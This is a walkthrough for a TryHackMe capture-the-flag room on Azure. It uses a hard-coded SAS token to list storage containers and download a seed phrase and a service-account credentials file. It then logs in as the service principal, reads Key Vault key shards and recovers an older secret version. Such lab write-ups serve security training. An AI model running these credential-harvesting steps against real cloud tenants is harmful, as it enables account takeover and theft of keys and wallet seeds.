tryhackme room link: https://tryhackme.com/room/hh-cryptocabana-f81cac95
YouTube video walk through: https://youtu.be/-6vUxb-t4Rg

##Prepare the SAS for Azure CLI
```
ACCOUNT='cryptocabanaf5scjagc'
SAS='sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D'
```
##List every container in the storage account
```
az storage container list \
  --account-name "$ACCOUNT" \
  --sas-token "$SAS" \
  --query '[].name' \
  --output table
```
##enumerated the contents of vault:
```
az storage blob list \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --sas-token "$SAS" \
  --query '[].{Name:name,Size:properties.contentLength,Modified:properties.lastModified}' \
  --output table
```
##Download the seed phrase:
```
az storage blob download \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --name 'seed_phrase.txt' \
  --sas-token "$SAS" \
  --file seed_phrase.txt \
  --output none
```
##Read it:
```
cat seed_phrase.txt
```
##Download the service-account file:
```
az storage blob download \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --name 'backup-service-account.json' \
  --sas-token "$SAS" \
  --file backup-service-account.json \
  --output none
```
##Pretty-print the JSON:
```
jq . backup-service-account.json
```
```
CLIENT_ID=$(jq -r '.client_id' backup-service-account.json)
CLIENT_SECRET=$(jq -r '.client_secret' backup-service-account.json)
TENANT_ID=$(jq -r '.tenant_id' backup-service-account.json)
VAULT_NAME=$(jq -r '.key_vault_name' backup-service-account.json)
``` 
 
##authenticated as the service principal:
```
az login \
  --service-principal \
  --username "$CLIENT_ID" \
  --password "$CLIENT_SECRET" \
  --tenant "$TENANT_ID" \
  --allow-no-subscriptions \
  --output none
```
##verify the current identity:
```
az account show --query user --output json
```
##the client ID and show an identity type such as servicePrincipal.

##List secrets in Azure Key Vault

##We listed secret names and metadata:
```
az keyvault secret list \
  --vault-name "$VAULT_NAME" \
  --query '[].{Name:name,Enabled:attributes.enabled,Updated:attributes.updated}' \
  --output table
```
##This returned:
```
key-shard-1
key-shard-2
key-shard-3
master-key
```
##Retrieve individual secret values

##retrieved the current value of each shard:
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-1' \
  --query value \
  --output tsv
```
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --query value \
  --output tsv
```
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-3' \
  --query value \
  --output tsv
```
##Recover the older version of shard 2

##Azure Key Vault secrets are versioned. When someone updates a secret, Azure normally creates a new version. The previous version is not automatically destroyed.

##list all versions of shard 2:
```
az keyvault secret list-versions \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --query '[].{Version:id,Created:attributes.created,Updated:attributes.updated,Enabled:attributes.enabled}' \
  --output table
```  
##Choose the earlier version, take the final VERSION_ID component, and request that specific version:
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --version '3d6492d2c6f74123bc754a9ded22b2a0' \
  --query value \
  --output tsv
```
